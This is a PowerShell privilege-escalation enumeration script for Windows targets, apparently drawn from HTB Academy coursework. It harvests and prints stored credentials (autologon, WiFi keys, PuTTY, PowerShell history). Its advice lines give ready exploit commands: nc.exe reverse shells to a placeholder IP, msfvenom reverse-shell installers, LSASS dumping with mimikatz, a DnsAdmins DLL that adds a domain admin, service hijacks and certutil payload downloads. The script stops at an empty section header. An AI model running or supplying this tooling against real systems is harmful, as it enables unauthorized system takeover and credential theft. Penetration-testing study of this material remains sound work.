# ============================================================
# WWPE - Windows Privilege Escalation Enumerator
# Based on HTB Academy Windows Privilege Escalation Module
# Run on target as: powershell -ep bypass -File wwpe_enum.ps1
# ============================================================

$OutputFile = "wwpe_output_$($env:COMPUTERNAME)_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

# Color codes
function Write-Red    { param($msg) Write-Host "[!!!] $msg" -ForegroundColor Red;    "[!!!] $msg" | Out-File $OutputFile -Append }
function Write-Yellow { param($msg) Write-Host "[??] $msg"  -ForegroundColor Yellow; "[??] $msg"  | Out-File $OutputFile -Append }
function Write-Green  { param($msg) Write-Host "[+] $msg"   -ForegroundColor Green;  "[+] $msg"   | Out-File $OutputFile -Append }
function Write-Info   { param($msg) Write-Host "$msg";                                "$msg"       | Out-File $OutputFile -Append }
function Write-Next   { param($msg) Write-Host "  [NEXT STEPS] $msg" -ForegroundColor Yellow; "  [NEXT STEPS] $msg" | Out-File $OutputFile -Append }

function Write-Section {
    param($title)
    $line = "=" * 60
    Write-Host "`n$line" -ForegroundColor Cyan
    Write-Host "  SECTION: $title" -ForegroundColor Cyan
    Write-Host "$line" -ForegroundColor Cyan
    "`n$line`n  SECTION: $title`n$line" | Out-File $OutputFile -Append
}

# Excluded paths for file searches
$ExcludePaths = @("C:\Windows\WinSxS", "C:\Windows\assembly", "C:\Windows\Microsoft.NET",
                  "C:\Windows\SoftwareDistribution", "C:\Windows\servicing")

# LOLBAS binaries from module
$LOLBAS = @("certutil","rundll32","mshta","regsvr32","msbuild","cmstp","installutil",
            "regasm","regsvcs","wmic","cscript","wscript","forfiles","pcalua","msiexec",
            "appsyncpublishingserver","msconfig","infdefaultinstall","ieexec","replace",
            "mavinject","bginfo","cdb","csi","dnscmd","dnx","fsi","msdeploy","msdt",
            "msiexec","presentationhost","rcsi","xwizard","appsyncpublishingserver",
            "bash","at","atbroker","explorer","hh","mmc","notepad","odbcconf",
            "pcwrun","scriptrunner","syncappvpublishingserver","winrm","wuauclt")

# Dangerous privileges from module
$DangerousPrivs = @{
    "SeImpersonatePrivilege"        = "Potato attacks (JuicyPotato/PrintSpoofer/RoguePotato) -> SYSTEM"
    "SeAssignPrimaryTokenPrivilege" = "Potato attacks -> SYSTEM"
    "SeDebugPrivilege"              = "Dump LSASS / inject into SYSTEM process"
    "SeTakeOwnershipPrivilege"      = "Take ownership of any file/object"
    "SeBackupPrivilege"             = "Read any file bypassing ACL (SAM/NTDS)"
    "SeRestorePrivilege"            = "Write anywhere on filesystem"
    "SeLoadDriverPrivilege"         = "Load malicious kernel driver -> SYSTEM"
    "SeSecurityPrivilege"           = "Manage audit/security log"
    "SeTcbPrivilege"                = "Full OS impersonation"
    "SeCreateTokenPrivilege"        = "Create arbitrary tokens"
    "SeManageVolumePrivilege"       = "Volume maintenance -> file manipulation"
}

# Dangerous groups from module
$DangerousGroups = @{
    "Administrators"         = "Full local admin"
    "Domain Admins"          = "Full domain admin"
    "Enterprise Admins"      = "Full forest admin"
    "Server Operators"       = "Modify services, backup files, access SMB on DCs"
    "Backup Operators"       = "SeBackupPrivilege + SeRestorePrivilege, log on to DCs locally"
    "Print Operators"        = "SeLoadDriverPrivilege - can load malicious kernel driver"
    "DnsAdmins"              = "Load malicious DLL into DNS service running as SYSTEM"
    "Hyper-V Administrators" = "Control VMs - if virtual DCs exist, effectively Domain Admin"
    "Account Operators"      = "Modify domain accounts and groups"
    "Remote Desktop Users"   = "RDP access - check for further lateral movement"
    "Remote Management Users"= "PSRemoting/WinRM access to hosts"
    "Event Log Readers"      = "Read security event logs - may contain cleartext credentials"
    "Schema Admins"          = "Modify AD schema"
}

# ============================================================
# HEADER
# ============================================================
Write-Host ""
Write-Host "  ____      ____  ____  _____" -ForegroundColor Cyan
Write-Host " / ___\    /    \/    \/   __\" -ForegroundColor Cyan
Write-Host " | |  _ _ | |  || |  ||   __/" -ForegroundColor Cyan
Write-Host " | |_| | || |  || |  ||  |   " -ForegroundColor Cyan
Write-Host "  \____/|_|\____/\____/\__|   " -ForegroundColor Cyan
Write-Host "  Windows Privilege Escalation Enumerator" -ForegroundColor Cyan
Write-Host "  Based on HTB Academy Windows PrivEsc Module" -ForegroundColor Cyan
Write-Host ""
Write-Green "Output saving to: $OutputFile"
Write-Green "Started: $(Get-Date)"

# ============================================================
# PASSWORD PROMPT
# ============================================================
Write-Host ""
Write-Host "[*] Enter current user password for enhanced checks (press Enter to skip):" -ForegroundColor Cyan
$SecurePass = Read-Host -AsSecureString "Password"
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePass)
$UserPass = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

if ($UserPass -ne "") {
    Write-Green "Password stored for use in privilege checks"
} else {
    Write-Yellow "No password provided - some checks may be limited"
}

# ============================================================
Write-Section "1 - SYSTEM IDENTITY"
# ============================================================
Write-Green "Hostname: $($env:COMPUTERNAME)"
Write-Green "Current User: $($env:USERNAME)"
Write-Green "Domain: $($env:USERDOMAIN)"
Write-Info ""

$sysinfo = systeminfo 2>$null
Write-Info $sysinfo

# Check if domain joined
if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain) {
    Write-Yellow "Host is DOMAIN JOINED - AD environment detected"
    Write-Next "Enumerate domain with: net user /domain, net group /domain, Get-ADUser"
}

# VM detection
if ($sysinfo -match "VMware|VirtualBox|Hyper-V|Virtual Machine") {
    Write-Yellow "Virtual machine detected - check for Hyper-V Administrators group and VHDX files"
}

# ============================================================
Write-Section "2 - PATCH LEVEL AND KERNEL CVE CHECK"
# ============================================================
Write-Green "Installed hotfixes:"
try {
    $hotfixes = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object HotFixID, InstalledOn, Description
    Write-Info ($hotfixes | Format-Table -AutoSize | Out-String)

    $lastPatch = ($hotfixes | Where-Object { $_.InstalledOn } | Sort-Object InstalledOn -Descending | Select-Object -First 1).InstalledOn
    if ($lastPatch) {
        $daysSince = ((Get-Date) - $lastPatch).Days
        if ($daysSince -gt 90) {
            Write-Red "Last patch was $daysSince days ago ($lastPatch) - likely missing critical updates"
            Write-Next "Run: wmic qfe list brief - then cross-reference missing KBs"
        } else {
            Write-Green "Last patch: $lastPatch ($daysSince days ago)"
        }
    }
} catch {
    Write-Yellow "Could not retrieve hotfix list"
    wmic qfe list brief 2>$null | Out-File $OutputFile -Append
}

# OS Version for CVE matching
$os = Get-WmiObject Win32_OperatingSystem
$build = $os.BuildNumber
$osName = $os.Caption
Write-Green "OS: $osName (Build $build)"

# CVE checks based on build number from module
$cveChecks = @(
    @{ Build="14393"; Name="Server 2016 / Win10 1607"; CVEs=@("MS17-010 EternalBlue","CVE-2019-1388 Cert Dialog UAC bypass","CVE-2020-0668 Service Tracing") }
    @{ Build="17763"; Name="Server 2019 / Win10 1809"; CVEs=@("CVE-2021-36934 HiveNightmare","CVE-2021-1675 PrintNightmare","CVE-2021-34527 PrintNightmare") }
    @{ Build="19041"; Name="Win10 2004";               CVEs=@("CVE-2021-36934 HiveNightmare","CVE-2022-0847 DirtyPipe (WSL)") }
    @{ Build="7600";  Name="Server 2008 R2 / Win7 SP0"; CVEs=@("MS10-092 Task Scheduler","MS16-032 Secondary Logon","MS17-010 EternalBlue") }
    @{ Build="7601";  Name="Server 2008 R2 / Win7 SP1"; CVEs=@("MS10-092 Task Scheduler","MS16-032 Secondary Logon","MS15-051 Win32k","MS17-010 EternalBlue") }
)

foreach ($check in $cveChecks) {
    if ($build -eq $check.Build) {
        Write-Red "Build $build matches $($check.Name) - known vulnerable CVEs:"
        foreach ($cve in $check.CVEs) {
            Write-Red "  -> $cve"
        }
    }
}

# HiveNightmare check - SAM readable
try {
    $samAcl = icacls "C:\Windows\System32\config\SAM" 2>$null
    if ($samAcl -match "BUILTIN\\Users.*RX|Everyone.*RX") {
        Write-Red "CVE-2021-36934 HiveNightmare - SAM file readable by Users group"
        Write-Next "Run HiveNightmare.exe OR: reg save HKLM\SAM sam.bak, reg save HKLM\SYSTEM sys.bak"
        Write-Next "Then: secretsdump.py -sam sam.bak -system sys.bak LOCAL"
    }
} catch {}

# PrintNightmare - check spooler
$spooler = Get-Service -Name Spooler -ErrorAction SilentlyContinue
if ($spooler -and $spooler.Status -eq "Running") {
    Write-Yellow "Print Spooler service is RUNNING - check for PrintNightmare (CVE-2021-1675)"
    Write-Next "Test: ls \\localhost\pipe\spoolss - if exists, spooler is active"
    Write-Next "Exploit: Import-Module CVE-2021-1675.ps1; Invoke-Nightmare -NewUser hacker -NewPassword Pwnd1234!"
}

# AlwaysInstallElevated
$aieHKCU = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aieHKLM = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($aieHKCU -eq 1 -and $aieHKLM -eq 1) {
    Write-Red "AlwaysInstallElevated is ENABLED in both HKCU and HKLM"
    Write-Next "msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=9443 -f msi > evil.msi"
    Write-Next "msiexec /i evil.msi /quiet /qn /norestart"
    Write-Next "OR: Import-Module PowerUp.ps1; Write-UserAddMSI"
}

# ============================================================
Write-Section "3 - CURRENT USER PRIVILEGES"
# ============================================================
Write-Green "whoami /priv output:"
$privOutput = whoami /priv 2>$null
Write-Info $privOutput

foreach ($priv in $DangerousPrivs.Keys) {
    if ($privOutput -match $priv) {
        $state = if ($privOutput -match "$priv.*Enabled") { "ENABLED" } else { "Disabled (may be enableable)" }
        Write-Red "DANGEROUS PRIVILEGE: $priv [$state]"
        Write-Next $DangerousPrivs[$priv]
        switch ($priv) {
            "SeImpersonatePrivilege" {
                if ($build -gt 17763) {
                    Write-Next "Use PrintSpoofer: PrintSpoofer.exe -c `"nc.exe <IP> 4443 -e cmd`""
                    Write-Next "Use RoguePotato for Server 2019/Win10"
                } else {
                    Write-Next "Use JuicyPotato: JuicyPotato.exe -l 53375 -p cmd.exe -a `"/c nc.exe <IP> 4443 -e cmd`" -t *"
                }
            }
            "SeDebugPrivilege" {
                Write-Next "Dump LSASS: procdump.exe -accepteula -ma lsass.exe lsass.dmp"
                Write-Next "Then: mimikatz sekurlsa::minidump lsass.dmp + sekurlsa::logonpasswords"
                Write-Next "OR: Import psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<SYSTEM_PID>, 'cmd.exe', '')"
            }
            "SeTakeOwnershipPrivilege" {
                Write-Next "Enable: Import-Module Enable-Privilege.ps1; .\EnableAllTokenPrivs.ps1"
                Write-Next "Then: takeown /f 'C:\target\file.txt'"
                Write-Next "Then: icacls 'C:\target\file.txt' /grant $($env:USERNAME):F"
            }
            "SeBackupPrivilege" {
                Write-Next "Import SeBackupPrivilegeUtils.dll + SeBackupPrivilegeCmdLets.dll"
                Write-Next "Copy-FileSeBackupPrivilege 'C:\Windows\NTDS\ntds.dit' .\ntds.dit"
                Write-Next "reg save HKLM\SAM SAM.SAV && reg save HKLM\SYSTEM SYSTEM.SAV"
            }
            "SeLoadDriverPrivilege" {
                Write-Next "Compile EnableSeLoadDriverPrivilege.cpp, add Capcom.sys to HKCU registry"
                Write-Next "Run EnableSeLoadDriverPrivilege.exe, then ExploitCapcom.exe"
                Write-Next "OR automated: EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys"
            }
        }
    }
}

# ============================================================
Write-Section "4 - USER AND GROUP MEMBERSHIP"
# ============================================================
Write-Green "whoami /groups output:"
$groupOutput = whoami /groups 2>$null
Write-Info $groupOutput

foreach ($group in $DangerousGroups.Keys) {
    if ($groupOutput -match [regex]::Escape($group)) {
        Write-Red "MEMBER OF DANGEROUS GROUP: $group"
        Write-Next $DangerousGroups[$group]
        switch ($group) {
            "Backup Operators" {
                Write-Next "Dump DC creds: diskshadow expose C: as E:, Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit"
                Write-Next "Also: reg save HKLM\SAM + HKLM\SYSTEM then secretsdump.py"
            }
            "DnsAdmins" {
                Write-Next "msfvenom -p windows/x64/exec cmd='net group `"domain admins`" <user> /add /domain' -f dll -o evil.dll"
                Write-Next "dnscmd.exe /config /serverlevelplugindll C:\path\to\evil.dll"
                Write-Next "sc stop dns && sc start dns"
                Write-Next "CLEANUP: reg delete \\<DC>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll"
            }
            "Server Operators" {
                Write-Next "sc qc <service> to find SYSTEM service, then:"
                Write-Next "sc config <service> binPath= 'cmd /c net localgroup Administrators <user> /add'"
                Write-Next "sc start <service>"
            }
            "Print Operators" {
                Write-Next "Compile EnableSeLoadDriverPrivilege.cpp to enable SeLoadDriverPrivilege"
                Write-Next "Load Capcom.sys via HKCU registry then ExploitCapcom.exe"
            }
        }
    }
}

Write-Green "`nAll local users:"
Write-Info (net user 2>$null | Out-String)
Write-Green "All local groups:"
Write-Info (net localgroup 2>$null | Out-String)
Write-Green "Local Administrators:"
Write-Info (net localgroup administrators 2>$null | Out-String)

# ============================================================
Write-Section "5 - UAC STATUS"
# ============================================================
$uacEnabled = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue).EnableLUA
$uacLevel   = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin

Write-Green "UAC Enabled (EnableLUA): $uacEnabled"
Write-Green "UAC Level (ConsentPromptBehaviorAdmin): $uacLevel"

$levelDesc = switch ($uacLevel) {
    0 { "DISABLED - No UAC prompt at all" }
    1 { "Prompt for credentials on secure desktop (high security)" }
    2 { "Prompt for consent on secure desktop" }
    3 { "Prompt for credentials" }
    4 { "Prompt for consent" }
    5 { "Prompt for consent for non-Windows binaries (default)" }
    default { "Unknown level" }
}

if ($uacEnabled -eq 0) {
    Write-Red "UAC is DISABLED - no bypass needed, run commands directly as admin"
} elseif ($uacLevel -le 4) {
    Write-Yellow "UAC level $uacLevel ($levelDesc) - bypass techniques likely available"
    Write-Next "Check UACME project for applicable bypass by Windows build number $build"
    Write-Next "DLL hijack via SystemPropertiesAdvanced.exe (technique 54, build 14393+):"
    Write-Next "Place malicious srrstr.dll in C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\"
    Write-Next "Then run: C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe"
} else {
    Write-Yellow "UAC level $uacLevel ($levelDesc) - hardest level, fewer bypasses"
}

# Check PATH for writable directories (UAC DLL hijack prerequisite)
Write-Green "`nPATH directories (checking for writeable):"
$env:PATH -split ";" | ForEach-Object {
    if ($_ -ne "" -and (Test-Path $_)) {
        try {
            $testFile = Join-Path $_ "wwpe_test_$([System.Guid]::NewGuid().ToString().Substring(0,8)).tmp"
            [System.IO.File]::Create($testFile).Close()
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
            Write-Red "Writable PATH directory: $_"
            Write-Next "DLL hijack opportunity - place malicious DLL here for UAC bypass or service abuse"
        } catch {
            Write-Green "PATH: $_ (not writable)"
        }
    }
}

# ============================================================
Write-Section "6 - SERVICES ENUMERATION"
# ============================================================
Write-Green "Checking for weak service binary permissions (SharpUp-style):"

$services = Get-WmiObject Win32_Service | Where-Object { $_.PathName -ne $null }

foreach ($svc in $services) {
    $path = $svc.PathName -replace '"','' -replace ' .*',''
    if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
        try {
            $acl = Get-Acl $path -ErrorAction SilentlyContinue
            foreach ($access in $acl.Access) {
                if ($access.FileSystemRights -match "FullControl|Write|Modify" -and
                    $access.IdentityReference -match "Everyone|BUILTIN\\Users|Authenticated Users|$($env:USERNAME)") {
                    Write-Red "Weak binary ACL: $($svc.Name) -> $path"
                    Write-Red "  Permission: $($access.FileSystemRights) for $($access.IdentityReference)"
                    Write-Next "Replace binary with malicious exe, then: sc start $($svc.Name)"
                    Write-Next "Backup original first: copy `"$path`" `"$path.bak`""
                }
            }
        } catch {}
    }
}

Write-Green "`nChecking for weak service permissions (SERVICE_ALL_ACCESS for non-admins):"
$svcList = @("WindscribeService","AppReadiness","UsoSvc","wuauserv")
foreach ($svcName in $svcList) {
    $svcCheck = Get-Service $svcName -ErrorAction SilentlyContinue
    if ($svcCheck) {
        Write-Yellow "Notable service found: $svcName - check with accesschk.exe /accepteula -quvcw $svcName"
    }
}

Write-Green "`nSearching for unquoted service paths:"
$unquoted = Get-WmiObject Win32_Service |
    Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch "^C:\\Windows" } |
    Select-Object Name, PathName, StartMode, StartName

foreach ($svc in $unquoted) {
    Write-Yellow "Unquoted service path: $($svc.Name)"
    Write-Yellow "  Path: $($svc.PathName)"
    Write-Yellow "  Runs as: $($svc.StartName)"
    Write-Next "If any directory in path is writable, place malicious binary there to intercept on start"
}

Write-Green "`nChecking for weak registry ACLs on services:"
try {
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services"
    Get-ChildItem $regPath -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $acl = Get-Acl $_.PSPath -ErrorAction SilentlyContinue
            foreach ($access in $acl.Access) {
                if ($access.RegistryRights -match "FullControl|SetValue|WriteKey" -and
                    $access.IdentityReference -match "Everyone|BUILTIN\\Users|Authenticated Users") {
                    Write-Red "Weak registry ACL on service: $($_.PSChildName)"
                    Write-Next "Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\$($_.PSChildName) -Name ImagePath -Value 'C:\path\to\malicious.exe'"
                }
            }
        } catch {}
    }
} catch {}

# ============================================================
Write-Section "7 - SCHEDULED TASKS"
# ============================================================
Write-Green "Scheduled tasks running as SYSTEM or Administrator:"
try {
    $tasks = Get-ScheduledTask | Where-Object { $_.Principal.RunLevel -eq "Highest" -or $_.Principal.UserId -match "SYSTEM|Administrator" }
    foreach ($task in $tasks) {
        $action = ($task.Actions | Select-Object -First 1).Execute
        $args   = ($task.Actions | Select-Object -First 1).Arguments
        Write-Yellow "Task: $($task.TaskName) | Runs as: $($task.Principal.UserId)"
        Write-Yellow "  Action: $action $args"

        # Check if script/binary is writable
        if ($action -and (Test-Path $action -ErrorAction SilentlyContinue)) {
            try {
                $acl = Get-Acl $action -ErrorAction SilentlyContinue
                foreach ($access in $acl.Access) {
                    if ($access.FileSystemRights -match "FullControl|Write|Modify" -and
                        $access.IdentityReference -match "Everyone|BUILTIN\\Users|Authenticated Users|$($env:USERNAME)") {
                        Write-Red "WRITABLE scheduled task binary: $action"
                        Write-Next "Replace with malicious binary - will execute as SYSTEM on next run"
                    }
                }
            } catch {}
        }
    }
} catch {
    Write-Yellow "Could not enumerate scheduled tasks - try: schtasks /query /fo LIST /v"
}

# Check C:\Scripts or similar writable directories
$scriptDirs = @("C:\Scripts", "C:\Backup", "C:\Jobs", "C:\Tasks", "C:\Automation")
foreach ($dir in $scriptDirs) {
    if (Test-Path $dir) {
        try {
            $testFile = Join-Path $dir "wwpe_test_$([System.Guid]::NewGuid().ToString().Substring(0,8)).tmp"
            [System.IO.File]::Create($testFile).Close()
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
            Write-Red "Writable script directory found: $dir"
            Write-Next "Check if any script here runs via scheduled task - append reverse shell if so"
        } catch {}
    }
}

# ============================================================
Write-Section "8 - LOLBAS BINARY CHECK"
# ============================================================
Write-Green "Checking for LOLBAS binaries present on system:"
$searchPaths = @("C:\Windows\System32", "C:\Windows\SysWOW64", "C:\Windows")
foreach ($lolbin in $LOLBAS) {
    foreach ($searchPath in $searchPaths) {
        $binPath = Join-Path $searchPath "$lolbin.exe"
        if (Test-Path $binPath) {
            Write-Yellow "LOLBAS binary found: $binPath"
        }
    }
}
Write-Next "Reference: https://lolbas-project.github.io/"
Write-Next "Useful for: file transfer, UAC bypass, code execution, persistence"
Write-Next "certutil file transfer: certutil.exe -urlcache -split -f http://<IP>/file.exe file.exe"

# ============================================================
Write-Section "9 - NAMED PIPES"
# ============================================================
Write-Green "Checking named pipes for weak permissions:"
try {
    $pipes = [System.IO.Directory]::GetFiles("\\.\pipe\")
    Write-Yellow "Named pipes found: $($pipes.Count) total"
    Write-Next "Use accesschk.exe /accepteula -w \pipe\* -v to find pipes with weak permissions"
    Write-Next "accesschk.exe /accepteula \\.\Pipe\lsass -v to check LSASS pipe"

    # Check for interesting pipe names
    foreach ($pipe in $pipes) {
        $pipeName = $pipe -replace "\\\\\.\\pipe\\",""
        if ($pipeName -match "WindscribeService|docker|sql|admin|debug") {
            Write-Yellow "Interesting named pipe: $pipeName"
            Write-Next "Check with: accesschk.exe /accepteula \\.\Pipe\$pipeName -v"
        }
    }
} catch {
    Write-Yellow "Could not enumerate pipes directly - try: gci \\.\pipe\"
}

# ============================================================
Write-Section "10 - AUTOLOGON AND REGISTRY CREDENTIALS"
# ============================================================
Write-Green "Checking Windows Autologon registry keys:"
$autologon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
if ($autologon.AutoAdminLogon -eq "1") {
    Write-Red "AutoLogon is ENABLED"
    Write-Red "  Username: $($autologon.DefaultUserName)"
    Write-Red "  Domain:   $($autologon.DefaultDomainName)"
    if ($autologon.DefaultPassword) {
        Write-Red "  Password: $($autologon.DefaultPassword)"
    }
    Write-Next "Try these credentials via runas, RDP, or SMB"
}

Write-Green "`nChecking PuTTY saved sessions for proxy credentials:"
try {
    $puttySessions = Get-ChildItem "HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions" -ErrorAction SilentlyContinue
    foreach ($session in $puttySessions) {
        $sessionData = Get-ItemProperty $session.PSPath -ErrorAction SilentlyContinue
        if ($sessionData.ProxyUsername -or $sessionData.ProxyPassword) {
            Write-Red "PuTTY session with proxy credentials: $($session.PSChildName)"
            Write-Red "  ProxyUsername: $($sessionData.ProxyUsername)"
            Write-Red "  ProxyPassword: $($sessionData.ProxyPassword)"
        } else {
            Write-Yellow "PuTTY session found: $($session.PSChildName) - Host: $($sessionData.HostName)"
        }
    }
} catch {}

Write-Green "`nChecking for AlwaysInstallElevated in registry:"
$aieHKCU2 = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aieHKLM2 = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated
Write-Green "  HKCU AlwaysInstallElevated: $aieHKCU2"
Write-Green "  HKLM AlwaysInstallElevated: $aieHKLM2"

# ============================================================
Write-Section "11 - SAVED CREDENTIALS (CMDKEY)"
# ============================================================
Write-Green "Saved credentials via cmdkey:"
$cmdkeyOutput = cmdkey /list 2>$null | Out-String
Write-Info $cmdkeyOutput

if ($cmdkeyOutput -match "Target:") {
    Write-Yellow "Saved credentials found in cmdkey"
    Write-Next "Use saved creds: runas /savecred /user:<domain>\<user> 'cmd.exe'"
    Write-Next "Or for RDP: Target may auto-authenticate when connecting"
}

# ============================================================
Write-Section "12 - POWERSHELL HISTORY"
# ============================================================
Write-Green "Checking PowerShell history for current user:"
$histPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
if ($histPath -and (Test-Path $histPath)) {
    $hist = Get-Content $histPath -ErrorAction SilentlyContinue
    Write-Yellow "PowerShell history file: $histPath ($($hist.Count) entries)"

    $credLines = $hist | Select-String -Pattern "password|passwd|credential|secret|token|/u:|/p:" -CaseSensitive:$false
    if ($credLines) {
        foreach ($line in $credLines) {
            Write-Red "Potential credential in PS history: $($line.Line.Trim())"
        }
    }
} else {
    Write-Yellow "No PowerShell history file found at default path"
}

# ============================================================
Write-Section "13 - INSTALLED APPLICATIONS"
# ============================================================
Write-Green "Installed applications (checking for known vulnerable software):"
$installedApps = @()
try {
    $installedApps += Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue | Select-Object DisplayName, DisplayVersion
    $installedApps += Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue | Select-Object DisplayName, DisplayVersion
}  catch {}

# Known vulnerable apps from module
$vulnApps = @{
    "Druva inSync"      = "6.6.3 - RPC command injection on localhost:6064 -> SYSTEM"
    "mRemoteNG"         = "Check confCons.xml for encrypted credentials - default master pass: mR3m"
    "FileZilla Server"  = "Check for FTP admin interface on port 14147"
    "Splunk"            = "Universal Forwarder may allow unauthenticated app deployment -> RCE"
    "TeamViewer"        = "Older versions stored credentials in registry - check for CVEs"
    "WinSCP"            = "May have saved sessions with credentials in registry"
}

foreach ($app in $installedApps) {
    if ($app.DisplayName) {
        Write-Info "  Installed: $($app.DisplayName) $($app.DisplayVersion)"
        foreach ($vulnApp in $vulnApps.Keys) {
            if ($app.DisplayName -match [regex]::Escape($vulnApp)) {
                Write-Red "KNOWN VULNERABLE APP: $($app.DisplayName) $($app.DisplayVersion)"
                Write-Next $vulnApps[$vulnApp]
            }
        }
    }
}

# Check for mRemoteNG config
$mremoteConfig = "$env:APPDATA\mRemoteNG\confCons.xml"
if (Test-Path $mremoteConfig) {
    Write-Red "mRemoteNG config found: $mremoteConfig"
    Write-Next "python3 mremoteng_decrypt.py -s '<Password_value_from_xml>'"
    Write-Next "If custom master password: python3 mremoteng_decrypt.py -s '<val>' -p <password>"
    $xmlContent = Get-Content $mremoteConfig -ErrorAction SilentlyContinue
    $passwords = $xmlContent | Select-String -Pattern 'Password="[^"]+"' | ForEach-Object { $_.Matches[0].Value }
    foreach ($p in $passwords) {
        Write-Yellow "  mRemoteNG encrypted entry: $p"
    }
}

# ============================================================
Write-Section "14 - NETWORK AND SERVICES"
# ============================================================
Write-Green "Network interfaces:"
Write-Info (ipconfig /all 2>$null | Out-String)

Write-Green "Active connections (looking for localhost-only services):"
$netstat = netstat -ano 2>$null | Out-String
Write-Info $netstat

# Highlight localhost-only listeners
netstat -ano | Select-String "127.0.0.1|::1" | ForEach-Object {
    $line = $_.Line.Trim()
    if ($line -match "LISTENING") {
        Write-Yellow "Localhost listener: $line"
        $port = ($line -split "\s+")[1] -replace ".*:",""
        switch ($port) {
            "14147" { Write-Red "Port 14147 - FileZilla admin interface! Possible credential extraction"; Write-Next "Connect to FileZilla admin on localhost:14147" }
            "6064"  { Write-Red "Port 6064 - Druva inSync! Vulnerable to RPC injection"; Write-Next "Use Druva inSync PoC script against localhost:6064" }
            "25672" { Write-Yellow "Port 25672 - Erlang/RabbitMQ. Check for weak cookie auth" }
        }
    }
}

Write-Green "`nARP cache (recently contacted hosts for lateral movement):"
Write-Info (arp -a 2>$null | Out-String)

Write-Green "`nRouting table (check for dual-homed / pivot opportunities):"
Write-Info (route print 2>$null | Out-String)

# ============================================================
Write-Section "15 - WIFI PASSWORDS"
# ============================================================
Write-Green "Saved wireless profiles:"
try {
    $profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
    foreach ($profile in $profiles) {
        Write-Yellow "WiFi profile: $profile"
        $key = netsh wlan show profile "$profile" key=clear 2>$null | Select-String "Key Content"
        if ($key) {
            Write-Red "  WiFi password: $($key -replace '.*: ','')"
        }
    }
} catch {
    Write-Yellow "Could not enumerate WiFi profiles (may require admin)"
}

# ============================================================
Write-Section "16 - WINDOWS DEFENDER AND APPLOCKER"
# ============================================================
Write-Green "Windows Defender status:"
try {
    $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
    if ($defender) {
        Write-Info "  RealTimeProtectionEnabled: $($defender.RealTimeProtectionEnabled)"
        Write-Info "  AntivirusEnabled: $($defender.AntivirusEnabled)"
        Write-Info "  BehaviorMonitorEnabled: $($defender.BehaviorMonitorEnabled)"
        if (-not $defender.RealTimeProtectionEnabled) {
            Write-Red "Windows Defender Real-Time Protection is DISABLED"
            Write-Next "Tools can be run without AV interference"
        }
    }
} catch {
    Write-Yellow "Could not query Defender status"
}

Write-Green "`nAppLocker policy:"
try {
    $applockerPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
    if ($applockerPolicy) {
        Write-Yellow "AppLocker is configured - check which binaries/paths are blocked"
        Write-Info ($applockerPolicy | Select-Object -ExpandProperty RuleCollections | Out-String)
        Write-Next "Test binary: Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone"
        Write-Next "Bypass options: msbuild.exe, regasm.exe, regsvcs.exe, installutil.exe (check LOLBAS)"
    } else {
        Write-Green "AppLocker: No effective policy found"
    }
} catch {
    Write-Yellow "Could not query AppLocker - may not be configured"
}

# ============================================================
Write-Section "17 - AUTORUN PROGRAMS"
# ============================================================
Write-Green "Startup programs (checking for writable binaries):"
try {
    $startups = Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User
    foreach ($startup in $startups) {
        Write-Yellow "Autorun: $($startup.Name) | $($startup.Command) | User: $($startup.User)"
        $binPath = ($startup.Command -replace '"','').Split(" ")[0]
        if ($binPath -and (Test-Path $binPath -ErrorAction SilentlyContinue)) {
            try {
                $acl = Get-Acl $binPath -ErrorAction SilentlyContinue
                foreach ($access in $acl.Access) {
                    if ($access.FileSystemRights -match "FullControl|Write|Modify" -and
                        $access.IdentityReference -match "Everyone|BUILTIN\\Users|Authenticated Users") {
                        Write-Red "Writable autorun binary: $binPath"
                        Write-Next "Replace with malicious binary - executes on next user login"
                    }
                }
            } catch {}
        }
    }
} catch {
    Write-Yellow "Could not enumerate startup programs"
}

# ============================================================
